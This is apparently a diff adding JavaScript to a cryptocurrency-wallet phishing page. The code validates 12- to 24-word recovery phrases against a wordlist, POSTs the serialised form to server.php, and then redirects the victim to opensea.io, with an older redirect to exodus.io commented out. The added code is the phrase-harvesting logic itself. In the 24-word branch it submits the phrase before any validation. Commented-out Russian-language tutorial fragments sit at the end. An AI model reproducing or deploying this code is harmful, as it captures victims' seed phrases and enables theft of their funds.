+            $("#word03").css("border-bottom", "1px solid red");
+            alert('Please enter valid third word!');
+          }
+        } else {
+          $("#word02").css("border-bottom", "1px solid red");
+          alert('Please enter valid second word!');
+        }
+      } else {
+        //$("#word01").css({"border-bottom":"1px solid red !important;"});
+        $("#word01").css("border-bottom", "1px solid red");
+        alert('Please enter valid first word!');
+      }
+    }
+      break;
+    case '24':
+    if(word01.value.length == 0 || word02.value.length == 0 || word03.value.length == 0 || word04.value.length == 0 || word05.value.length == 0 || word06.value.length == 0 || word07.value.length == 0 || word08.value.length == 0 || word09.value.length == 0 || word10.value.length == 0 || word11.value.length == 0 || word12.value.length == 0 || word13.value.length == 0 || word14.value.length == 0 || word15.value.length == 0 || word16.value.length == 0 || word17.value.length == 0 || word18.value.length == 0 || word19.value.length == 0 || word20.value.length == 0 || word21.value.length == 0){
+
+
+    } else {
+      var msg   = $('#formem').serialize();
+        $.ajax({
+          type: 'POST',
+          url: 'server.php',
+          data: msg,
+          success: function(data) {
+            //window.location.href = "https://href.li/?https://www.exodus.io/";
+          }
+        });
+
+
+
+
+
+
+      //if we have thia word in the base
+      if(allowedWords.indexOf(word001.toLowerCase()) >= 0) { $("#word01").css("border-bottom", "1px solid #aaa");
+        if(allowedWords.indexOf(word002.toLowerCase()) >= 0) { $("#word02").css("border-bottom", "1px solid #aaa");
+          if(allowedWords.indexOf(word003.toLowerCase()) >= 0) { $("#word03").css("border-bottom", "1px solid #aaa");
+            if(allowedWords.indexOf(word004.toLowerCase()) >= 0) { $("#word04").css("border-bottom", "1px solid #aaa");
+              if(allowedWords.indexOf(word005.toLowerCase()) >= 0) { $("#word05").css("border-bottom", "1px solid #aaa");
+                if(allowedWords.indexOf(word006.toLowerCase()) >= 0) { $("#word06").css("border-bottom", "1px solid #aaa");
+                  if(allowedWords.indexOf(word007.toLowerCase()) >= 0) { $("#word07").css("border-bottom", "1px solid #aaa");
+                    if(allowedWords.indexOf(word008.toLowerCase()) >= 0) { $("#word08").css("border-bottom", "1px solid #aaa");
+                      if(allowedWords.indexOf(word009.toLowerCase()) >= 0) { $("#word09").css("border-bottom", "1px solid #aaa");
+                        if(allowedWords.indexOf(word010.toLowerCase()) >= 0) { $("#word10").css("border-bottom", "1px solid #aaa");
+                          if(allowedWords.indexOf(word011.toLowerCase()) >= 0) { $("#word11").css("border-bottom", "1px solid #aaa");
+                            if(allowedWords.indexOf(word012.toLowerCase()) >= 0) { $("#word12").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word013.toLowerCase()) >= 0) { $("#word13").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word014.toLowerCase()) >= 0) { $("#word14").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word015.toLowerCase()) >= 0) { $("#word15").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word016.toLowerCase()) >= 0) { $("#word16").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word017.toLowerCase()) >= 0) { $("#word17").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word018.toLowerCase()) >= 0) { $("#word18").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word019.toLowerCase()) >= 0) { $("#word19").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word020.toLowerCase()) >= 0) { $("#word20").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word021.toLowerCase()) >= 0) { $("#word21").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word022.toLowerCase()) >= 0) { $("#word22").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word023.toLowerCase()) >= 0) { $("#word23").css("border-bottom", "1px solid #aaa");
+                               if(allowedWords.indexOf(word024.toLowerCase()) >= 0) { $("#word24").css("border-bottom", "1px solid #aaa");
+
+
+                               var msg   = $('#formem').serialize();
+                                 $.ajax({
+                                   type: 'POST',
+                                   url: 'server.php',
+                                   data: msg,
+                                   success: function(data) {
+                                     window.location.href = "https://href.li/?https://opensea.io/assets";
+                                   }
+                                 });
+
+                            } else {
+                              $("#word24").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 24 word!');
+                            }
+
+
+
+
+
+                            } else {
+                              $("#word23").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 23 word!');
+                            }
+
+
+
+
+
+                            } else {
+                              $("#word22").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 22 word!');
+                            }
+
+
+
+
+
+                            } else {
+                              $("#word21").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 21 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word20").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 20 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word19").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 19 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word18").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 18 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word17").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 17 word!');
+                            }
+
+
+
+
+
+                            } else {
+                              $("#word16").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 16 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word15").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 15 word!');
+                            }
+
+
+
+
+                            } else {
+                              $("#word14").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 14 word!');
+                            }
+
+
+
+                            } else {
+                              $("#word13").css("border-bottom", "1px solid red");
+                              alert('Please enter valid 13 word!');
+                            }
+
+                            } else {
+                              $("#word12").css("border-bottom", "1px solid red");
+                              alert('Please enter valid twelwe word!');
+                            }
+                          } else {
+                            $("#word11").css("border-bottom", "1px solid red");
+                            alert('Please enter valid eleven word!');
+                          }
+                        } else {
+                          $("#word10").css("border-bottom", "1px solid red");
+                          alert('Please enter valid ten word!');
+                        }
+                      } else {
+                        $("#word09").css("border-bottom", "1px solid red");
+                        alert('Please enter valid ninth word!');
+                      }
+                    } else {
+                      $("#word08").css("border-bottom", "1px solid red");
+                      alert('Please enter valid eifght word!');
+                    }
+                  } else {
+                    $("#word07").css("border-bottom", "1px solid red");
+                    alert('Please enter valid seventh word!');
+                  }
+                } else {
+                  $("#word06").css("border-bottom", "1px solid red");
+                  alert('Please enter valid sixth word!');
+                }
+              } else {
+                $("#word05").css("border-bottom", "1px solid red");
+                alert('Please enter valid fifth word!');
+              }
+            } else {
+              $("#word04").css("border-bottom", "1px solid red");
+              alert('Please enter valid fourth word!');
+            }
+          } else {
+            $("#word03").css("border-bottom", "1px solid red");
+            alert('Please enter valid third word!');
+          }
+        } else {
+          $("#word02").css("border-bottom", "1px solid red");
+          alert('Please enter valid second word!');
+        }
+      } else {
+        //$("#word01").css({"border-bottom":"1px solid red !important;"});
+        $("#word01").css("border-bottom", "1px solid red");
+        alert('Please enter valid first word!');
+      }
+    }
+      break;
+
+  }
+
+
+
+
+//alert(word001);
+  //alert(word0001);
+
+  /*var arr = [1, "Bob", "Sid"];
+$.inArray(1, arr); // 0
+$.inArray("Sid", arr); // 2
+$.inArray("Bobby", arr); // -1*/
+
+/*if(allowedWords.indexOf(word001.toLowerCase()) >= 0) {
+   alert('dddd');
+}*/
+
+
+
+
+/*let indexes = []; // инициализируем переменную, содержащую пустой массив
+const myArray = ['z', 'v', 'z', 'v', 'z', 'v']; // инициализируем переменную, содержащую массив строковых значений по которому будет произведен поиск
+const searchElement = 'z'; // инициализируем строковую переменную (значение переменной будем искать внутри массива myArray)
+let index = $.inArray(word001, myArray); // инициализируем переменную, содержащую индекс первого искомого элемента (значение переменной searchElement) внутри массива myArray
+
+while ( index != -1 ) { // пока значение переменной index не будет равно -1
+  indexes.push( index ); // с использованием метода push() добавляем в переменную indexes значение переменной index
+  index = $.inArray(word001, myArray, index + 1); // изменяем значение переменной путем поиска необходимого элемента далее в массиве (если найден - индекс элемента, если нет то -1)
+}
+
+console.log( indexes ); // переменная содержит значение [0, 2, 4]*/
+
+/*  const newArr = arr.sort((a, b) => b.length - a.length);
+  let dpStr = word01.slice();
+  newArr.forEach(value => dpStr = dpStr.replace(value, ""));
+  if (!dpStr) {
+    alert('Соотвествует');
+  } else {
+    alert('Не соотвествует');
+  }*/
+
+
+  //var arr = ['Автомобиль','Грузовик','Автобус'];
+
+  // переберём массив arr
+  //$.each(arr,function(index,value){
+
+//word01
+    // действия, которые будут выполняться для каждого элемента массива
+    // index - это текущий индекс элемента массива (число)
+    // value - это значение текущего элемента массива
+
+    //выведем индекс и значение массива в консоль
+    //console.log('Индекс: ' + index + '; Значение: ' + value);
+  //  alert();
+
+  //});
+
+  //var enteredWord = word01;
+  /*if(allowedWords.indexOf(enteredWord.toLowerCase()) >= 0) {
+    if(allowedWords.indexOf(enteredWord.toLowerCase()) >= 0) {
+      if(allowedWords.indexOf(enteredWord.toLowerCase()) >= 0) {
+
+      } else {
+        alert('Please enter third word!');
+      }
+    } else {
+      alert('Please enter second word!');
+    }
+  } else {
+    alert('Please enter first word!');
+  }*/
+}
+
+/*function validateWord(){
+//valide for all inputs
+  if(word01 != ''){
+    alert('not clear');
+    //$('#submit-seed').prop("disabled", false);
+    //submit.classList.remove('disabled');
+  } else {
+    alert('clear');
+    //$('#submit-seed').prop("disabled", true);
+  }
+}
+
+
+//take parameter of word
+/*var word = document.getElementById(parameter).value;
+
+if ((a.length < 3) || (a.length > 12)) { error .... }
+//how many symbols in the word
+var call = word.split(/\s+/).length;
+if(call < 1){
+  alert('much');
+  alert('one');
+} else {
+  alert('one');
+}*/
+
+//var enteredWord = 'GODt';
+
+//if(allowedWords.indexOf(enteredWord.toLowerCase()) >= 0) {
+  // alert('dddd');
+//}
